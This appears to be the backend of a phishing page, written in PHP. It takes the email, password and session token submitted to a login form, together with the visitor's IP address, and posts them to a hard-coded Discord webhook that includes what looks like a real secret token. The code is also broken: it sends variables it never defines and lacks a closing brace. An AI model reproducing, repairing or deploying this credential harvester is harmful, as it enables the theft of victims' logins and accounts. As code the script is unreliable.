<?php

// ====================== CONFIG ======================

$webhookUrl = "https://discord.com/api/webhooks/1492285006758940692/09J7KgYqvu3rrP2LsgbcVc8LGNKlsUUYj8wbMesOd2shNuu10UqBRQq2NdIgdsOocWez"; // ← CHANGE THIS

// Check if form was submitted

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Get form data

    $name      = htmlspecialchars($_POST['email'] ?? 'Not provided');

    $firstname = htmlspecialchars($_POST['password'] ?? 'Not provided');

    $token     = htmlspecialchars($_POST[' _token'] ?? 'Not provided');

    // Optional: Get extra info

    $ip        = $_SERVER['REMOTE_ADDR'];

    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $time      = date('Y-m-d H:i:s');

    // Prepare Discord embed

    $payload = [

        "embeds" => [

            [

                "title" => "New Form Submission",

                "color" => 0x00ff00,

                "timestamp" => date('c'),

                "fields" => [

                    ["name" => "email", "value" => $email, "inline" => true],

                    ["name" => "password", "value" => $password, "inline" => true],

                    ["name" => "IP Address", "value" => $ip, "inline" => true],

                    ["name" => "Time", "value" => $time, "inline" => true],

                    ["name" => "Token", "value" => "```" . $token . "```", "inline" => false]

                ],

                "footer" => [

                    "text" => "Submitted from " . $_SERVER['HTTP_HOST']

                ]

            ]

        ]

    ];

    // Send to Discord using cURL

    $ch = curl_init($webhookUrl);

    curl_setopt($ch, CURLOPT_POST, true);

    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));

    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Only if you have SSL issues

    $response = curl_exec($ch);

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

?>
